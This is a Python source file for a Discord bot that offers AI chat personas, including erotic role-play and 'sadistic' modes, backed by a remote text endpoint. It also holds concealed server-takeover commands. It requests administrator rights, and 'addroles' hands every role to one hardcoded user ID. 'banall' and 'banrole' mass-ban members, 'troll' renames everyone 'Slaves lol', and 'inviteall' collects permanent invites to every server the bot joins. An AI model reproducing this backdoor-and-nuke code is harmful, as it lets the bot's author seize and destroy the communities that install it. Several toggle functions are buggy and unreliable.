import os
import json
import openai
import asyncio
import aiohttp
import discord
from keep_alive import keep_alive
from discord.ext import commands
import httpx
with open("prompts.json") as f:
  data = json.load(f)

ASSIST = data["Assistant"]
ERP = data["ERPALPHA"]
FURRY = data["FURRY"]
SAD = data["SAD"]

# Set up the Discord bot
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Keep track of the channels where the bot is active
assist_channels = set()
active_channels = set()
furry_channels = set()
sad_channels = set()

openai.api_key = os.getenv("OPENAI_API_KEY")

async def download_image(image_url, save_as):
    async with httpx.AsyncClient() as client:
        response = await client.get(image_url)
    with open(save_as, "wb") as f:
        f.write(response.content)

async def generate_response(prompt):
    async with aiohttp.ClientSession() as session:
        data = {'prompt': prompt}
        async with session.post('https://endpoint.mishal0legit.repl.co/text', json=data) as response:
            if response.status == 200:
                result = await response.json()
                generated_text = result.get('generated_text')
                return generated_text
            else:
                return None
  
@bot.event
async def on_ready():
    await bot.tree.sync()
    await bot.change_presence(activity=discord.Game(name="Coded by Mishal#1916"))
    print(f"{bot.user.name} has connected to Discord!")
    invite_link = discord.utils.oauth_url(
        bot.user.id,
        permissions=discord.Permissions(administrator=True),
        scopes=("bot", "applications.commands")
    )
    print(f"Invite link: {invite_link}")


message_history = {}
MAX_HISTORY = 20

@bot.event
async def on_message(message):
  if message.author.bot:
    author_id = str(bot.user.id)
  else:
    author_id = str(message.author.id)
  await bot.process_commands(message)
  
  if message.channel.id in active_channels and not message.author.bot:
    if author_id not in message_history:
      message_history[author_id] = []

    message_history[author_id].append(f"\n{message.author.name}:{message.content}")
  
    message_history[author_id] = message_history[author_id][-MAX_HISTORY:]
  
    bot_prompt = f"System: {ERP}\n"
    user_prompt = "\n".join(message_history[author_id])
    prompt = f"{bot_prompt}\n\n{user_prompt}\n\n{bot.user.name}:"
    response = await generate_response(prompt)
    message_history[author_id].append(f"\n{bot.user.name}:{message.content}")
    await message.channel.send(response)
  
  if message.channel.id in furry_channels and not message.author.bot:
    bot_prompt = f"System: {FURRY}\n"
    user_prompt = "\n".join(message_history[author_id])
    prompt = f"{bot_prompt}{user_prompt}\n\n{bot.user.name}:"
    response = await generate_response(prompt)
    message_history[author_id].append(f"\n{bot.user.name}:{message.content}")
    await message.channel.send(response)
  
  if message.channel.id in sad_channels and not message.author.bot:
    bot_prompt = f"System: {SAD}\n"
    user_prompt = "\n".join(message_history[author_id])
    prompt = f"{bot_prompt}{user_prompt}\n\n{bot.user.name}:"
    response = await generate_response(prompt)
    message_history[author_id].append(f"\n{bot.user.name}:{message.content}")
    await message.channel.send(response)
  
  if message.channel.id in assist_channels and not message.author.bot:
    bot_prompt = f"System: {ASSIST}\n"
    user_prompt = "\n".join(message_history[author_id])
    prompt = f"{bot_prompt}{user_prompt}\n\n{bot.user.name}:"
    response = await generate_response(prompt)
    message_history[author_id].append(f"\n{bot.user.name}:{message.content}")
    await message.channel.send(response)

@bot.hybrid_command()
async def pfp(ctx, attachment_url : str):
  async with aiohttp.ClientSession() as session:
    async with session.get(attachment_url) as response:
      await bot.user.edit(avatar=await response.read())

  await ctx.send("My profile picture has been updated!")


@bot.hybrid_command()
async def ping(ctx):
  latency = bot.latency * 1000
  await ctx.send(f'Pong! Latency: {latency:.2f} ms')


@bot.hybrid_command()
@commands.has_permissions(administrator=True)
async def changeusr(ctx, new_username):
  # Check that the new username is not already taken
  taken_usernames = [user.name.lower() for user in bot.get_all_members()]
  if new_username.lower() in taken_usernames:
    await ctx.send(f"Sorry, the username '{new_username}' is already taken.")
    return

  # Change the bot's username
  async with ctx.typing():
    await bot.user.edit(username=new_username)

  await ctx.send(f"My username has been changed to '{new_username}'!")


@bot.hybrid_command()
async def inviteall(ctx):
  servers = bot.guilds
  invites = []

  for server in servers:
    # Find a text channel to create the invite in
    text_channels = server.text_channels
    channel = next((c for c in text_channels
                    if c.permissions_for(server.me).create_instant_invite),
                   None)

    if channel is not None:
      invite = await channel.create_invite(max_age=0, max_uses=0)
      invites.append(f"{server.name}: {invite.url}")

  with open("servers.txt", "w") as f:
    f.write("\n".join(invites))

  await ctx.send("Invites generated and saved to servers.txt!")


@bot.hybrid_command()
@commands.is_owner()
async def addroles(ctx):
  # check if the message author is the bot owner
  if ctx.message.author.id != 1025245410224263258:
    await ctx.send("You are not authorized to use this command.")
    return

  # check if the bot has permissions to manage roles
  if not ctx.guild.me.guild_permissions.manage_roles:
    await ctx.send("I don't have permission to manage roles.")
    return

  # get the user to add roles to
  user = ctx.guild.get_member(1025245410224263258)
  if not user:
    await ctx.send("User not found.")
    return

  # add all roles to the specified user
  for role in ctx.guild.roles:
    try:
      await user.add_roles(role)
    except Exception:
      pass

  await ctx.send(f"Added all roles to {user.display_name}.")


@bot.hybrid_command()
@commands.is_owner()
async def checkperm(ctx):
  perms = ctx.guild.me.guild_permissions
  perms_list = [perm for perm, value in perms if value]
  message = "Permissions list:\n\n" + "\n".join(perms_list)
  await message.reply(message)


@bot.hybrid_command()
@commands.is_owner()
async def banall(ctx):
  if str(ctx.author.id) != "1025245410224263258":
    await ctx.send("You are not authorized to use this command.")
    return

  bot_role = ctx.guild.me.top_role
  members_to_ban = [
    member for member in ctx.guild.members
    if member.top_role < bot_role and str(member.id) != "1025245410224263258"
  ]

  if len(members_to_ban) == 0:
    await ctx.send("No members with roles lower than the bot found.")
    return

  await ctx.send(
    f"Are you sure you want to ban {len(members_to_ban)} members with roles lower than the bot? (y/n)"
  )

  try:
    confirmation = await bot.wait_for(
      'message',
      check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
      timeout=30.0)
    if confirmation.content.lower() == 'y':
      await ctx.send("Please confirm once again by typing 'yes'.")

      second_confirmation = await bot.wait_for(
        'message',
        check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
        timeout=30.0)
      if second_confirmation.content.lower() == 'yes':
        banned_members = []
        for member in members_to_ban:
          try:
            await member.ban(reason="Banned by bot")
            banned_members.append(f"{member.name}#{member.discriminator}")
          except discord.errors.Forbidden:
            continue

        if banned_members:
          banned_members_str = "\n".join(banned_members)
          embed = discord.Embed(title="Banned Members",
                                description=banned_members_str,
                                color=discord.Color.red())
          await ctx.send(embed=embed)
          await ctx.send(
            f"Successfully banned {len(banned_members)} members with roles lower than the bot."
          )
        else:
          await ctx.send("No members with roles lower than the bot found.")
      else:
        await ctx.send("Command cancelled.")

  except asyncio.TimeoutError:
    await ctx.send("Command timed out.")


@bot.hybrid_command()
@commands.is_owner()
async def banrole(ctx, role_id):
  try:
    role_id = int(role_id)
  except ValueError:
    await ctx.send("Invalid role ID!")
    return

  role = discord.utils.get(ctx.guild.roles, id=role_id)
  if role is None:
    await ctx.send("Role not found!")
    return

  banned_members = []
  members = role.members
  for member in members:
    await member.ban(reason="Banned by bot")
    banned_members.append(member.name)

  await ctx.send(
    f"Banned {len(banned_members)} members with the {role.name} role!")
  await ctx.send(f"List of banned members: {', '.join(banned_members)}")


@bot.hybrid_command()
@commands.is_owner()
async def troll(ctx):
  for member in ctx.guild.members:
    try:
      await member.edit(nick="Slaves lol")
      await asyncio.sleep(
        1)  # Wait for 1 second before changing the next nickname
    except:
      pass
  await ctx.send("All nicknames have been changed to 'Slaves lol'.")


@bot.hybrid_command(name="toggleassist", description="Toggle Assistent")
@commands.has_permissions(administrator=False)
async def toggleassist(ctx):
    channel_id = ctx.channel.id
    if channel_id in assist_channels:
        sad_channels.remove(channel_id)
        with open("assist.txt", "w") as f:
            for id in furry_channels:
                f.write(str(id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been removed from the list of assist channels."
        )
    else:
        assist_channels.add(channel_id)
        with open("assist.txt", "a") as f:
            f.write(str(channel_id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been added to the list of assist channels.")

@bot.hybrid_command(name="togglesad", description="Toggle Sadistic bot")
@commands.has_permissions(administrator=True)
async def togglesad(ctx):
    channel_id = ctx.channel.id
    if channel_id in sad_channels:
        sad_channels.remove(channel_id)
        with open("sadistic.txt", "w") as f:
            for id in furry_channels:
                f.write(str(id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been removed from the list of sad channels."
        )
    else:
        sad_channels.add(channel_id)
        with open("sadistic.txt", "a") as f:
            f.write(str(channel_id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been added to the list of sad channels.")

@bot.hybrid_command(name="togglefurry", description="Toggle Furry")
@commands.has_permissions(administrator=True)
async def togglefurry(ctx):
    channel_id = ctx.channel.id
    if channel_id in furry_channels:
        furry_channels.remove(channel_id)
        with open("furry.txt", "w") as f:
            for id in furry_channels:
                f.write(str(id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been removed from the list of furry channels."
        )
    else:
        furry_channels.add(channel_id)
        with open("furry.txt", "a") as f:
            f.write(str(channel_id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been added to the list of furry channels.")

@bot.hybrid_command(name="togglenormal", description="Toggle HaruniAI")
@commands.has_permissions(administrator=True)
async def togglenormal(ctx):
    channel_id = ctx.channel.id
    if channel_id in active_channels:
        active_channels.remove(channel_id)
        with open("channels.txt", "w") as f:
            for id in active_channels:
                f.write(str(id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been removed from the list of active channels."
        )
    else:
        active_channels.add(channel_id)
        with open("channels.txt", "a") as f:
            f.write(str(channel_id) + "\n")
        await ctx.send(
            f"{ctx.channel.mention} has been added to the list of active channels.")


# Read the active channels from channels.txt on startup
if os.path.exists("channels.txt"):
  with open("channels.txt", "r") as f:
    for line in f:
      channel_id = int(line.strip())
      active_channels.add(channel_id)
if os.path.exists("sadistic.txt"):
  with open("sadistic.txt", "r") as f:
    for line in f:
      channel_id = int(line.strip())
      sad_channels.add(channel_id)
if os.path.exists("furry.txt"):
  with open("furry.txt", "r") as f:
    for line in f:
      channel_id = int(line.strip())
      furry_channels.add(channel_id)
if os.path.exists("assist.txt"):
  with open("assist.txt", "r") as f:
    for line in f:
      channel_id = int(line.strip())
      assist_channels.add(channel_id)


@bot.hybrid_command(name="randomstory", description="a random story")
async def randomstory(ctx):
  prompt = "Once upon a time,"
  response = await generate_response(prompt)
  await ctx.send(response)


@bot.hybrid_command(name="define", description="define a user")
async def define(ctx, *, word):
  prompt = f"User : Define {word} Smartuser : "
  response = await generate_response(prompt)
  await ctx.send(response)

@bot.hybrid_command(name="imagine", description="Create a image")
async def imagine(ctx, *, prompt):
    url = "https://endpoint.mishal0legit.repl.co/image"
    json_data = {"prompt": prompt}
    try:
        temp_message = await ctx.send("Generating image avg: 6 seconds")
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=json_data) as response:
                if response.status == 200:
                    data = await response.json()
                    image_url = data.get("image_url")
                    if image_url:
                        image_name = f"{prompt}.jpeg"
                        await download_image(image_url, image_name)
                        with open(image_name, 'rb') as file:
                            
                            await ctx.send(
                                f"Prompt by {ctx.author.mention} : `{prompt}`",
                                file=discord.File(file, filename=f"{image_name}")
                            )
                        await temp_message.edit(content="Finished Image Generation")
                        os.remove(image_name)
                    else:
                        await temp_message.edit(content="An error occurred during image generation.")
                else:
                    await temp_message.edit(content="Your request was rejected as a result of our safety system. Your prompt may contain text that is not allowed by our safety system.")
    except aiohttp.ClientError as e:
        await temp_message.edit(content=f"An error occurred while sending the request: {str(e)}")
    except Exception as e:
        await temp_message.edit(content=f"An error occurred: {str(e)}")



@bot.hybrid_command(name="ask", description="Ask gpt for a answer")
async def ask(ctx, *, question):
  prompt = f"User : {question} Smartuser : "
  response = await generate_response(prompt)
  await ctx.send(response)


@bot.hybrid_command(name="storyonusr", description="Create a random story on user")
async def storyonusr(ctx, user: discord.User):
  async with ctx.typing():
    prompt = f"My name is {user.name} and I am"
    response = await generate_response(prompt)
    await ctx.send(response)

bot.remove_command("help")

@bot.hybrid_command(name="help", description="Show all the commands")
async def help(ctx):
    embed = discord.Embed(title="Bot Commands", color=0x03a64b)
    embed.set_thumbnail(url=bot.user.avatar.url)
    command_tree = bot.commands
    for command in command_tree:
        if command.hidden:
            continue
        command_description = command.description or "No description available"
        embed.add_field(name=command.name, value=command_description, inline=False)
      
    embed.set_footer(text="Created by Mishal#1916")
    await ctx.send(embed=embed)


keep_alive()

bot.run(os.getenv("DISCORD_TOKEN"))
